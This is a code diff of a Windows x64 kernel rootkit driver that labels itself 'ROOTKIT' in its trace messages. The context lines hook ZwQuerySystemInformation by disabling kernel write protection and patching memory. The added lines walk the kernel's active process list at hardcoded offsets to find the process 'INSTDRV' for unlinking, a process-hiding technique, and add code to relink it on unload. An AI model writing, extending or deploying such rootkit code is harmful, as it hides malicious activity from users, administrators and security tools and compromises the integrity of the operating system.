@@ -10,15 +10,22 @@
 #include "hookssdt.h"
 
 UCHAR kbc_code[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+PLIST_ENTRY64 Remove_Entry = NULL;
+PUCHAR Sys_Process;
 
 VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
 {
 	Ktrace("ROOTKIT: OnUnload called\n");
+	if (Remove_Entry) {
+		InsertTailList(Sys_Process + 0x188, Remove_Entry);
+	}
+	
+	return;
 
    KIRQL irql = WPOFFx64();
    memcpy(ZwQuerySystemInformation, kbc_code, 12);
    WPONx64(irql);
-   return;
+
    // unhook system calls
    UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, KeBugCheckEx);
 
@@ -38,6 +45,27 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
    theDriverObject->DriverUnload  = OnUnload; 
 
    Ktrace("ROOTKIT: Onload called\n");
+
+   Sys_Process = (PUCHAR)PsInitialSystemProcess;
+   PLIST_ENTRY64 list_node = Sys_Process + 0x188;
+
+   UCHAR process_name[] = "INSTDRV";
+   INT	length = strlen(process_name);
+
+   while (TRUE) {
+	   PUCHAR image_process_name = (PUCHAR)list_node - 0x188 + 0x2e0;
+	   if (memcmp(image_process_name, process_name, length) == 0) {
+		   Remove_Entry = list_node;
+		   Ktrace("ROOTKIT: RemoveEntryList : %llx", (PULONGLONG)Remove_Entry);
+		   break;
+	   }
+	   list_node = list_node->Flink;
+   }
+
+   return STATUS_SUCCESS;
+
+   //PUCHAR test1 = &PsInitialSystemProcess;
+   //return STATUS_SUCCESS;
 
    PUCHAR	pucStartSearchAddress = (PUCHAR)__readmsr(0xC0000082);
    PUCHAR	pucEndSearchAddress = pucStartSearchAddress + SEARCH_RANGE;
@@ -75,10 +103,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
    //WPONx64(irql);
 
    WPONx64(irql);
-
-   return STATUS_SUCCESS;
-
-
 
    // Initialize global times to zero
    // These variables will account for the 
